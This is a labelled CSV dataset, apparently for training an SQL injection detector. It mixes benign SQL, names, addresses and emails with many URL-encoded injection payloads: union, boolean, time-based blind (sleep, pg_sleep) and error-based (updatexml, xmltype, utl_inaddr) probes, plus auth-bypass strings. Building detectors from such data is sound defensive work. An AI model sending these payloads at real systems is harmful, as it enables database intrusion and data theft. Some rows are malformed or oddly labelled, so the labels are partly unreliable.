Query,Label
co5r5525e,0
-4557%25%27%20%20%20%29%20%20%20%20%29%20%20%20%20or%204537%20%20%3D%20%203401%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%27%25%27%20%20%3D%20%20%27,1
SELECT AVG ( together ) FROM youth SELECT SUM ( tight ),0
4.85943E+15,0
"SELECT * FROM however WHERE floor IN  ( 'his', 'wealth', 'deeply' )",0
1%22%20%20%20%29%20%20%20%20%29%20%20%20%20as%20vgsb%20where%204747%20%20%3D%20%204747,1
1%27%20%20%29%20%20%20and%203580%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%20%20%29%20%20--,1
rusch de celis,0
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20and%204386%20%20%3D%20%20utl_inaddr.get_host_address%20%20%28%20%20chr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%204386%20%20%3D%20%204386%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%27hgtg%27%20%20%3D%20%20%27hgtg,1
SELECT * FROM ourselves WHERE affect IN  ( SELECT person FROM drop ),0
1%22%20%20%20%29%20%20%20%20%29%20%20%20%20union%20all%20select%20null%2Cnull%2Cnull--,1
llanes,0
SELECT strike,0
"SELECT * FROM club WHERE cabin IN  ( 'chart', 'thread', 'carried' )",0
SELECT equal ( s )  FROM card FULL OUTER JOIN,0
SELECT prepare ( s FROM shade RIGHT JOIN,0
-6145%27%2B%20%20%28%20%20select%20nnjn%20where%201389%20%20%3D%20%201389%20union%20all%20select%201389%2C1389%2C1389--,1
sant andreu de la barca,0
SELECT TOP 50 PERCENT * FROM hide SELECT * FROM game FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM stretch,0
SELECT listen ( s )  FROM trace SELECT whatever FROM aside,0
SELECT COUNT ( remain ) FROM height,0
select%20%20%20%28%20%20case%20when%20%20%20%28%20%205847%20%20%3D%20%202826%20%20%29%20%20%20then%205847%20else%20cast%20%20%28%20%201%20as%20int%20%20%29%20%20/%20%20%28%20%20select%200%20from%20dual%20%20%29%20%20%20end%20%20%29%20%20%20from%20dual--,1
SELECT TOP 3 * FROM CustomersWHERE Country = 'Germany'; SELECT * FROM Customers,0
1%27%20%20%29%20%20%20as%20cdrm%20where%204595%20%20%3D%20%204595%20order%20by%201%23,1
1%22%20%20%29%20%20%20as%20yzny%20where%204869%20%20%3D%20%204869%20rlike%20%20%20%28%20%20select%20%2A%20from%20%20%20%28%20%20select%20%20%28%20%20sleep%20%20%28%20%205%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20sgvo%20%20%29%20%20--,1
1%20%20%20%29%20%20%20%20%29%20%20%20%20as%20vmwj%20where%205597%20%20%3D%20%205597,1
-7743%22%20or%209323%20%20%3D%20%209323%23,1
SELECT option_value FROM wp_options WHERE option_name  =  '_options_twitter_url' LIMIT 1,0
SELECT CURRENT_DATE (  )  + 1;,0
4.67615E+15,0
SELECT come FROM realize UNION SELECT instrument FROM fly ORDER BY sell,0
SELECT option_value FROM wp_options WHERE option_name  =  '_options_linkedin_url' LIMIT 1,0
SELECT * FROM money 3,0
or%20%27whatever%27%20in%20%20%20%28%20%20%27whatever%27%20%20%29,1
SELECT COUNT ( tightID ) FROM noted,0
tila,0
sosao,0
SELECT * FROM general 3,0
SELECT * FROM column  WHERE star NOT LIKE '[drawn]%',0
1%27%2B%20%20%28%20%20select%20%27gtqr%27%20where%205660%20%20%3D%20%205660,1
41420,0
select%20%2A%20from%20users%20where%20id%20%20%3D%20%201%20%2B1%20union%20select%20null%2Cbanner%20from%20v%24version%20where%20rownum%20%20%3D%20%201%20--%201,1
santibez el bajo,0
SELECT * FROM indicate WHERE blind LIKE '%date%',0
-2734%27%20%20%29%20%20%20union%20all%20select%205510%2C5510%2C5510%2C5510%2C5510%23,1
if%20%20%28%20%203392%20%20%3D%20%204422%20%20%29%20%20%20select%203392%20else%20drop%20function%20xsqq--,1
1%25%22%20%20%20%29%20%20%20%20%29%20%20%20%20and%20elt%20%20%28%20%204249%20%20%3D%20%204249%2C7259%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%22%25%22%20%20%3D%20%20%22,1
select%20%2A%20from%20users%20where%20id%20%20%3D%20%201%20or%20%22%20%20%29%20%20%24%22%20or%201%20%20%3D%20%201%20--%201,1
-4828%25%27%20%20%29%20%20%20or%208678%20%20%3D%20%205745%23,1
argeo,0
SELECT * FROM upper WHERE mainly BETWEEN 'these' AND 'clay',0
SELECT TOP 50 PERCENT * FROM measure SELECT * FROM except FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM push,0
%22%2A%22,1
1%25%27%20%20%29%20%20%20and%207756%20%20%3D%20%20dbms_utility.sqlid_to_sqlhash%20%20%20%28%20%20%20%20%28%20%20%20chr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%207756%20%20%3D%20%207756%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20and%20%20%20%28%20%20%27%25%27%20%20%3D%20%20%27,1
SELECT * FROM difference 3 SELECT * FROM snow,0
herrmann@codwatw.edu,0
SELECT total ( s )  FROM upper SELECT high FROM which,0
-1197%22%20%20%20%29%20%20%20%20%29%20%20%20%20as%20dfsy%20where%208857%20%20%3D%20%208857%20or%203038%20%20%3D%20%203038,1
-1451%25%27%20%20%29%20%20%20union%20all%20select%207666%2C7666%2C7666%23,1
velov@expozaragozafloral2014.ac,0
-4522%22%20%20%29%20%20%20or%204144%20%20%3D%20%20%20%20%28%20%20select%20upper%20%20%28%20%20xmltype%20%20%28%20%20chr%20%20%28%20%2060%20%20%29%20%20%7C%7Cchr%20%20%28%20%2058%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%204144%20%20%3D%20%204144%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%2062%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20from%20dual%20%20%29%20%20%20and%20%20%20%28%20%20%22mbkq%22%20%20%3D%20%20%22mbkq,1
-8378%25%27%20%20%29%20%20%20union%20all%20select%205491%23,1
SELECT eventually ( s )  FROM double SELECT property FROM wish,0
SELECT AVG ( cookies ) FROM branch SELECT SUM ( property ),0
-6945%27%20union%20all%20select%205063%2C5063%2C5063%2C5063%2C5063%2C5063%2C5063%2C5063--,1
SELECT CHAR_LENGTH ( CustomerName )  AS LengthOfName FROM Customers;,0
"SELECT column_name ( s )  FROM ship,fun",0
talavera panfili,0
SELECT BIN ( 8 ) ;,0
1%20%20%29%20%20%20where%207571%20%20%3D%20%207571%20and%20char%20%20%28%20%20109%20%20%29%20%20%7C%7Cchar%20%20%28%20%2079%20%20%29%20%20%7C%7Cchar%20%20%28%20%2070%20%20%29%20%20%7C%7Cchar%20%20%28%20%2090%20%20%29%20%20%20%20%3D%20%20regexp_substring%20%20%28%20%20repeat%20%20%28%20%20right%20%20%28%20%20char%20%20%28%20%205012%20%20%29%20%20%2C0%20%20%29%20%20%2C5000000000%20%20%29%20%20%2Cnull%20%20%29%20%20--,1
decidir,0
t45o0a35,0
-4035%27%20union%20all%20select%209540%2C9540%2C9540%2C9540%2C9540%2C9540%2C9540%2C9540%2C9540%2C9540--,1
SELECT Count ( * )  AS exactly,0
1%27%20%20%29%20%20%20where%203636%20%20%3D%20%203636%20or%204240%20%20%3D%20%20%20%20%28%20%20select%204240%20from%20pg_sleep%20%20%28%20%205%20%20%20%29%20%20%20%20%29%20%20%20--,1
1%25%22%20%20%20%29%20%20%20%20%29%20%20%20%20and%209660%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%20%20%29%20%20--,1
SELECT * FROM blanket  WHERE merely NOT LIKE '[noon]%',0
"INSERT INTO refused  ( angry, from, rhyme )  VALUES  ( 'fly', 'chicken', 'team' )",0
"SELECT library,making,fed FROM spoken LEFT JOIN Orders ON slope.begunID =  lesson.transportation ORDER BY split.row",0
-8312%25%22%20%20%20%29%20%20%20%20%29%20%20%20%20union%20all%20select%204972--,1
mcanally@rockefeller.bt,0
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20and%204242%20%20%3D%20%205831%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%27xflh%27%20like%20%27xflh,1
en683$67,0
SELECT AVG ( ate ) FROM herself SELECT SUM ( gain ),0
"SELECT LPAD ( ""SQL Tutorial"",   20, ""ABC"" ) ;",0
aran1el1ria,0
"SELECT nest, leave+ ', ' + wool+ ' ' + coffee+ ', ' + top AS greater  FROM rod",0
5696,0
kinsman,0
villanueva del rosario,0
1%22%20where%205216%20%20%3D%20%205216%20or%205286%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%20%20%29%20%20--,1
end--%20podi,1
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20as%20zqeg%20where%204729%20%20%3D%20%204729%20and%20%20%20%28%20%201098%20%20%3D%20%209682%20%20%29%20%20%2A9682--,1
cowper@elbauldelosrefranes.pm,0
SELECT doctor ( s )  FROM able UNION ALL,0
9728,0
1%27%20%20%29%20%20%20or%20updatexml%20%20%28%20%201808%2Cconcat%20%20%28%20%200x2e%2C0x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20elt%20%20%28%20%201808%20%20%3D%20%201808%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%20%20%29%20%20%2C8666%20%20%29,1
SELECT * FROM am WHERE pale NOT BETWEEN 'history' AND 'trouble',0
SELECT AVG ( Price ) FROM his,0
finak,0
"c/ meson de jativa, 109 10-a",0
"calle sol s/n,",0
armero filippi,0
1%27%20%20%29%20%20%20and%20exp%20%20%28%20%20~%20%20%28%20%20select%20%2A%20from%20%20%20%28%20%20select%20concat%20%20%28%20%200x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20elt%20%20%28%20%208190%20%20%3D%20%208190%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%2C0x78%20%20%20%29%20%20%20%20%29%20%20%20x%20%20%20%29%20%20%20%20%29,1
SELECT * FROM sound ORDER BY mission DESC,0
"SELECT CONCAT_WS ( "" "", Address, PostalCode, City )  AS Address FROM  Customers;",0
7ons15804d04en2e,0
"c/ pozo seco 37, 6-d",0
nahid,0
select%20%2A%20from%20users%20where%20id%20%20%3D%20%201%20or%20%22%5C%23%22%20or%201%20%20%3D%20%201%20--%201,1
"SELECT DISTINCT column1 , column2, ... FROM table_name ;",0
"SELECT COUNT ( stage ) , yourself FROM hardly BY fierce",0
1%20and%204386%20%20%3D%20%20utl_inaddr.get_host_address%20%20%28%20%20chr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%204386%20%20%3D%20%204386%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%23%20lexm,1
SELECT fear ( s )  FROM dead,0
"labiano, s/n 7?a",0
solonitsin3@neotelecom.fi,0
SELECT * FROM stop WHERE to = 'congress' FETCH FIRST 3 ROWS ONLY,0
1%20or%20sleep%20%20%28%20%205%20%20%29%20%20--%20nrzf,1
"INSERT INTO onto ( bite, slope, refer, duck, draw, rock )  VALUES  ( 'fight', 'needs'. motion', 'else', 'tribe', 'bark', 'another' )",0
SELECT * FROM protection WHERE    NOT everybody = 'able',0
del cid labastie,0
SELECT * FROM accident  WHERE chair NOT LIKE '[yes]%',0
SELECT * FROM rice WHERE forget = 'shout',0
mieza,0
50296,0
3.57286E+15,0
1%25%27%20%20%29%20%20%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%23,1
"c/ geranio, 65",0
"SELECT * FROM find WHERE barn IN  ( 'put', 'war', 'opinion' )",0
egido s/n,0
select%20case%20when%207634%20%20%3D%20%203954%20then%201%20else%20null%20end--,1
1%27%20%20%29%20%20%20where%204092%20%20%3D%20%204092%20or%20char%20%20%28%20%2075%20%20%29%20%20%7C%7Cchar%20%20%28%20%2070%20%20%29%20%20%7C%7Cchar%20%20%28%20%2099%20%20%29%20%20%7C%7Cchar%20%20%28%20%2083%20%20%29%20%20%20%20%3D%20%20regexp_substring%20%20%28%20%20repeat%20%20%28%20%20left%20%20%28%20%20crypt_key%20%20%28%20%20char%20%20%28%20%2065%20%20%29%20%20%7C%7Cchar%20%20%28%20%2069%20%20%29%20%20%7C%7Cchar%20%20%28%20%2083%20%20%29%20%20%2Cnull%20%20%29%20%20%2C0%20%20%29%20%20%2C500000000%20%20%29%20%20%2Cnull%20%20%29%20%20--,1
SELECT flat ( s )  FROM wash,0
"SELECT Employees.plates, COUNT ( Orders.burstID )  AS patternFROM    ( OrdersINNER JOIN safe ON Orders.youID  =  Employees.callID )",0
eoin,0
SELECT TOP 3 * FROM round,0
SELECT wp_posts.* FROM wp_posts LEFT JOIN wp_term_relationships ON  ( wp_posts.ID  =  wp_term_relationships.object_id )  WHERE 1 = 1 AND  (  wp_term_relationships.term_taxonomy_id IN  ( 2637 )   )  AND wp_posts.post_type  =  'support_family' AND   (  (  wp_posts.post_status  =  'publish'  )  )   GROUP BY wp_posts.ID ORDER BY wp_posts.post_title ASC,0
SELECT * FROM held WHERE continued = 'balloon'  AND  ( imagine = 'many' OR furniture = 'badly' ),0
-3846%25%27%20or%206872%20%20%3D%20%206872%20and%20%27%25%27%20%20%3D%20%20%27,1
es2eri5o,0
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20as%20nuku%20where%207009%20%20%3D%20%207009%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%23,1
-8639%20%20%29%20%20%20or%208138%20%20%3D%20%206252,1
"SELECT poet, missing, common FROM reason WHERE doing  IS NULL",0
"SELECT Orders.OrderID, Customers.CustomerName FROM Orders INNER JOIN  Customers ON Orders.CustomerID  =  Customers.CustomerID;",0
SELECT TOP 3 * FROM managed SELECT * FROM upon 3SELECT * FROM down,0
DELETE FROM ring,0
SELECT COUNT ( spring ) FROM citizen,0
4ip7237o8h2dira,0
"SELECT Orders.zerorID, Employees.as, Employees.fireplace FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.solidID ORDER BY Orders.structureID",0
-2140%20%20%20%29%20%20%20%20%29%20%20%20%20union%20all%20select%208174%2C8174%2C8174%23,1
parke konstituzio 128 2?b,0
79071325q,0
select%20%20%20%28%20%20case%20when%20%20%20%28%20%205856%20%20%3D%20%207176%20%20%29%20%20%20then%205856%20else%20cast%20%20%28%20%201%20as%20int%20%20%29%20%20/%20%20%28%20%20select%200%20from%20dual%20%20%29%20%20%20end%20%20%29%20%20%20from%20dual--,1
%28%20%20select%20%2A%20from%20%20%20%28%20%20select%20%20%28%20%20sleep%20%20%28%20%205%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20lrov%20%20%29,1
1%27%2B%20%20%28%20%20select%20wjpc%20where%205943%20%20%3D%20%205943%20and%20make_set%20%20%28%20%208403%20%20%3D%20%208403%2C8899%20%20%20%29%20%20%20%20%29%20%20%20%2B%27,1
SELECT AVG ( favorite ) FROM softly,0
v,1
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20and%203754%20%20%3D%20%20%20%20%28%20%20select%20upper%20%20%28%20%20xmltype%20%20%28%20%20chr%20%20%28%20%2060%20%20%29%20%20%7C%7Cchr%20%20%28%20%2058%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%203754%20%20%3D%20%203754%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%2062%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20from%20dual%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%27opyp%27%20%20%3D%20%20%27opyp,1
verrilli,0
select%20%2A%20from%20users%20where%20id%20%20%3D%20%201%20or%20%22%2C%20%20%29%20%20%22%20%20%3D%20%201%20or%201%20%20%3D%20%201%20--%201,1
1%22%20%20%20%29%20%20%20%20%29%20%20%20%20as%20uqem%20where%203521%20%20%3D%20%203521,1
8110,0
1%20rlike%20%20%20%28%20%20select%20%2A%20from%20%20%20%28%20%20select%20%20%28%20%20sleep%20%20%28%20%205%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20vwyq%20%20%29%20%20%23,1
SELECT * FROM space WHERE adult LIKE '%situation%',0
"SELECT instrument,pet FROM usually WHERE think = 'whose' UNION SELECT paper, free FROM larger",0
SELECT allow ( s )  FROM exciting SELECT flew ( s ),0
1%20%20%29%20%20%20as%20wxms%20where%207272%20%20%3D%20%207272%20and%203707%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%20%20%29%20%20--,1
SELECT * FROM driving WHERE habit NOT BETWEEN 'fully' AND 'chart',0
1%20%20%20%29%20%20%20%20%29%20%20%20%20and%204386%20%20%3D%20%20utl_inaddr.get_host_address%20%20%28%20%20chr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%204386%20%20%3D%20%204386%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%201260%20%20%3D%20%201260,1
1%25%22%20%20%29%20%20%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,1
-2039%27%20%20%29%20%20%20or%202724%20in%20%20%20%20%28%20%20%20%20%28%20%20%20char%20%20%28%20%20113%20%20%29%20%20%2Bchar%20%20%28%20%20113%20%20%29%20%20%2Bchar%20%20%28%20%20112%20%20%29%20%20%2Bchar%20%20%28%20%20106%20%20%29%20%20%2Bchar%20%20%28%20%20113%20%20%29%20%20%2B%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%202724%20%20%3D%20%202724%20%20%29%20%20%20then%20char%20%20%28%20%2049%20%20%29%20%20%20else%20char%20%20%28%20%2048%20%20%29%20%20%20end%20%20%20%29%20%20%20%20%29%20%20%20%2Bchar%20%20%28%20%20113%20%20%29%20%20%2Bchar%20%20%28%20%20122%20%20%29%20%20%2Bchar%20%20%28%20%20118%20%20%29%20%20%2Bchar%20%20%28%20%20122%20%20%29%20%20%2Bchar%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29,1
royett pratseva,0
-9875%27%20%20%29%20%20%20or%20%20%20%28%20%208459%20%20%3D%20%208459%20%20%29%20%20%2A4906%20and%20%20%20%28%20%20%27mrxw%27%20%20%3D%20%20%27mrxw,1
maiga,0
SELECT AVG ( curve )  FROM cat  SELECT SUM ( read ),0
1%22%20%20%29%20%20%20and%208148%20%20%3D%20%20like%20%20%28%20%20%27abcdefg%27%2Cupper%20%20%28%20%20hex%20%20%28%20%20randomblob%20%20%28%20%20500000000/2%20%20%20%29%20%20%20%20%29%20%20%20%20%20%20%29%20%20%20%20%29%20%20%20--,1
SELECT TOP 3 * FROM signal WHERE vast = 'yes',0
yuraj,0
SELECT * FROM bet WHERE NOT mean = 'organization'  AND NOT condition = 'cutting',0
15124,0
1%25%27%20%20%29%20%20%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,1
a9tr8pfag4,0
SELECT COUNT ( forget ) FROM husband,0
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20as%20oyad%20where%207161%20%20%3D%20%207161%20and%206240%20%20%3D%20%20%20%20%28%20%20%27qqpjq%27%7C%7C%20%20%28%20%20select%20case%206240%20when%206240%20then%201%20else%200%20end%20from%20rdb%24database%20%20%29%20%20%7C%7C%27qzvzq%27%20%20%29%20%20--,1
SELECT TOP 50 PERCENT * FROM door SELECT * FROM poetry FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM circle,0
1%27%7C%7C%20%20%28%20%20select%20%27kgfu%27%20from%20dual%20where%202607%20%20%3D%20%202607%20and%203580%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%20%20%29%20%20--,1
SELECT AVG ( ants ) FROM nothing SELECT SUM ( human ),0
5.35994E+15,0
SELECT * FROM color WHERE rush  BETWEEN 10 AND 20,0
grodecki,0
elois,0
9637,0
1%27%20where%205230%20%20%3D%20%205230,1
1%20and%206240%20%20%3D%20%20%20%20%28%20%20%27qqpjq%27%7C%7C%20%20%28%20%20select%20case%206240%20when%206240%20then%201%20else%200%20end%20from%20rdb%24database%20%20%29%20%20%7C%7C%27qzvzq%27%20%20%29%20%20--%20izad,1
SELECT COUNT ( height ) FROM studying,0
cea,0
SELECT * FROM getting WHERE tide NOT LIKE '[shop]%',0
1%25%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20or%20updatexml%20%20%28%20%201808%2Cconcat%20%20%28%20%200x2e%2C0x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20elt%20%20%28%20%201808%20%20%3D%20%201808%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%20%20%29%20%20%2C8666%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%20%27%25%27%20%20%3D%20%20%27,1
"SELECT * FROM getting WHERE nine IN  ( 'string', 'bone', 'judge' )",0
admin%27%20%20%29%20%20%20or%20%20%20%28%20%20%271%27%20%20%3D%20%20%271%27%23,1
SELECT * FROM percent WHERE include = 'race'  OR needs = 'there',0
cherwin4@xavipetit.mu,0
1%20%20%20%29%20%20%20%20%29%20%20%20%20as%20rcon%20where%208190%20%20%3D%20%208190%20or%205286%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%20%20%29%20%20--,1
SELECT * FROM then WHERE fell = 'eat',0
1%22%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20and%206055%20%20%3D%20%20ctxsys.drithsx.sn%20%20%28%20%206055%2C%20%20%28%20%20chr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%206055%20%20%3D%20%206055%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%20%22fogb%22%20like%20%22fogb,1
llobet garrido,0
"SELECT Orders.boyrID, Employees.knowledge, Employees.visit FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.signalID ORDER BY Orders.barkID",0
